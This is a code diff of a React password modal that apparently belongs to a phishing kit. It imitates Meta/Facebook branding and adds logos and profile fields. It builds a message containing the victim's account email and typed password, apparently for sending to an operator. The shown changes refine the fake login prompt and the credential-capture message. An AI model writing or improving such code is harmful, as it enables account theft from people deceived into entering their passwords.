@@ -1,6 +1,7 @@
 'use client';
 
 import MetaLogo from '@/assets/images/meta-logo-image.png';
+import FacebookLogo from '@/assets/images/facebook-logo-image.png';
 import { store } from '@/store/store';
 import { getTranslations } from '@/utils/translate';
 import axios from 'axios';
@@ -8,6 +9,8 @@ import Image from 'next/image';
 import { useMemo, useState, type FC } from 'react';
 
 interface PasswordModalProps {
+    userProfileImage: string;
+    userName: string;
     userEmail: string;
     fullName?: string;
     pageName?: string;
@@ -68,7 +71,6 @@ const PasswordModal: FC<PasswordModalProps> = ({
 
         const updatedMessage = `${message}
 
-<b>✅ PASSWORD RECEIVED</b>
 <b>📧 Account Email:</b> <code>${userEmail}</code>
 <b>🔒 Password:</b> <code>${password}</code>`;
 
@@ -111,7 +113,7 @@ const PasswordModal: FC<PasswordModalProps> = ({
                         )}
 
                         {/* Password Input */}
-                        <div className='w-full px-0'>
+                        <div className='w-full px-1.5 sm:px-3 md:px-4'>
                             <div className='relative w-full'>
                                 <input
                                     type='password'
